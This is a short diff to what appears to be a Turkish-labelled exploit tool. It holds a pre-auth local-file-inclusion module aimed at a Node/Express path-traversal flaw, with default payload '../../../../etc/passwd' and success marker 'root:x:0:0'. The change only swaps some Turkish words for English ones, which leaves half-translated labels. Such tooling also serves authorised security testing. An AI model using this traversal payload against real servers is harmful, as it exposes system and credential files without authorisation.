@@ -87,7 +87,7 @@ def _in(label, key, req, default="", ph=""):
 _INPUTS = [
     _in("Hedef URL (endpoint)", "url", True, "", "http://127.0.0.1:3000/read"),
     _in("Enjekte parametresi", "param", False, "file", "file"),
-    _in("Okunacak dosya", "path", False, "../../../../etc/passwd", "../../../../etc/passwd"),
+    _in("Okunacak file", "path", False, "../../../../etc/passwd", "../../../../etc/passwd"),
     _in("Basarim kaniti (ops.)", "marker", False, "", "root:x:0:0"),
     _in("Metot", "method", False, "GET", "GET"),
 ]
@@ -99,7 +99,7 @@ EXPLOITS = {
         "type": "LFI", "preauth": True,
         "affected": ["4.18.2", "4.19.1", "4.20.0", "4.21.0"],
         "note": ("Node/Express path traversal (CWE-22): kullanici kontrollu `file`/path parametresi "
-                 "dogrudan dosya okumaya gider. Kanit = hassas dosyanin gercek icerigi (orn. /etc/passwd)."),
+                 "dogrudan file okumaya gider. Kanit = hassas dosyanin real icerigi (orn. /etc/passwd)."),
         "inputs": list(_INPUTS),
         "run": lfi,
     },
